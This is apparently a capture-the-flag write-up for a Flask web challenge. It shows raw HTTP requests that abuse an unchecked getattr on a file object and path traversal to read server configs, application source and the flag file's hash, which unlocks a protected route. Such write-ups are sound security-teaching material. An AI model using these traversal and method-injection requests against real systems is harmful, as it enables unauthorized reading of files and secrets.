# web-protected-area

## Task

The web application had a two API methods, similar to the methods from the previous task but not absolutely similar:

The first method could check that file is exists:
```
GET /check_perm/readable/?file=public.txt HTTP/1.1
Host: 66.172.33.148:8008

```

The second read file content:
```
GET /read_file/?file=public.txt HTTP/1.1
Host: 66.172.33.148:8008

```

Now the second method had filters like:
```
file = request.args.get("file").replace('../', '')
if file.find('.txt') != (len(file) - 4):
        return 'security'

```

## Solution

After we tried a some mutations in request to the first method, we could see the error message from the server after the next request:

Request:
```
GET /check_perm/asdfad/?file=public.txt HTTP/1.1
Host: 66.172.33.148:5008

```

Response:
```
'_io.TextIOWrapper' object has no attribute 'asdfad'
```


The `_io.TextIOWrapper` is python class that inherits from the class `io.TextIOBase` and have next interesting methods:
- read
- readlines
- readline
- etc...

Just check `read` attribute in the request and we could read an arbitrary files on the server:
```
GET /check_perm/read/?file=public.txt HTTP/1.1
Host: 66.172.33.148:5008
```

The right way for find `.py` server's files was to start with `nginx.conf` file:
request:
```
GET /check_perm/read/?file=./../etc/nginx/conf.d/nginx.conf HTTP/1.1
Host: 66.172.33.148:5008
```

response:
```
server {
    listen 80;
    location / {
        try_files $uri @app;
    }
    location @app {
        include uwsgi_params;
        uwsgi_pass unix:///tmp/uwsgi.sock;
    }
    location /static {
        alias /opt/py/app/static;
    }
}
```

Now we know that the server use `/opt/py/app/` folder as sources and **uwsgi** as web-server.

With this information we could find `uwsgi.ini` file in app folder with content:
```

[uwsgi]
module = main_application
callable = app
py-autoreload = 1
uid = nginx
gid = nginx
process = 5
max-requests=5000
```

And it was easy to understand that the application entrypoint  file is `main_application` + `.py`.
`/opt/py/app/main_application.py`:
```python
from app_source.main import *

app = create_app()

if __name__ == "__main__":
    app.run(host='0.0.0.0', debug=True)
```

Look at `/opt/py/app/app_source/main.py`:
```python
from flask import Flask

def create_app():
    """Construct the core application."""
    app = Flask(__name__, instance_relative_config=False)

    with app.app_context():
        # Imports
        from . import all_routes
        from . import admin_route

        return app
```

From the `main.py` we got a two main files:
`all_routes.py`:
```python

from flask import current_app as app
from flask import request, render_template, send_file
import traceback, json
import os

@app.route('/check_perm/<method>/', methods=['GET'])
def app_checkb_file(method) -> json:
    try:
        file = request.args.get("file")

        if file.find('/proc') != -1:
            return "0"

        file_path = os.path.normpath('/files/{}'.format(file))
        with open(file_path, 'r') as f:

            call = getattr(f, method)()
            if type(call) == int:
                return str(call)
            elif type(call) != list and file.find('flag') == -1:
                return str(call)

            return '0'
    except Exception as e:
        return str(e)

@app.route('/read_file/', methods=['GET'])
def app_read_file() -> str:
    
    file = request.args.get("file").replace('../', '')

    if file.find('.txt') != (len(file) - 4):
        return 'security'
    
    try:
        return send_file('/files/{}'.format(file))
    except Exception as e:
        return str(e)

@app.route('/', methods=['GET'])
def app_index() -> str:
    return render_template('index.html')

@app.errorhandler(404)
def not_found_error(error) -> str:
    return "Error 404"
```

and `admin_route.py`:
```python

from flask import current_app as app
from flask import request, render_template, send_file
import traceback, json
from config import *
import os

@app.route('/protected_area/<file_hash>', methods=['GET'])
def app_protected_area(file_hash) -> str:
    try:
        if str(hash(open(Config.FLAG))) == file_hash:
            return send_file(Config.FLAG_SEND)
        else:
            abort(403)
    except:
        return "500"
```

The file `admin_route.py` showed for us searched route `/protected_area/<file_hash>`.
For get the flag we should find decimal value of `hash()` function from FLAG file.

Config.py file contents:
```
import os

class Config:
    """Set Flask configuration vars from .env file."""

    # general config
    FLAG      = "flag/flag"
    FLAG_SEND = "../flag/flag"
```

What we know about hash function? 
1. The value of the `hash()` function will change with each new start of the python process (Not very important for us.)
2. "Internally, hash() method calls __hash__() method of an object which are set by default for any object. We'll look at this later.”

The second point means that we could execute the method __hash__ on a file object.
Try it!
request:
```
GET /check_perm/__hash__/?file=./../opt/py/app/flag/flag HTTP/1.1
Host: 66.172.33.148:5008
```

response:
```
8771321880381
```

And make request to get the flag:
```
GET /protected_area/8771321880381 HTTP/1.1
Host: 66.172.33.148:5008
```

Done!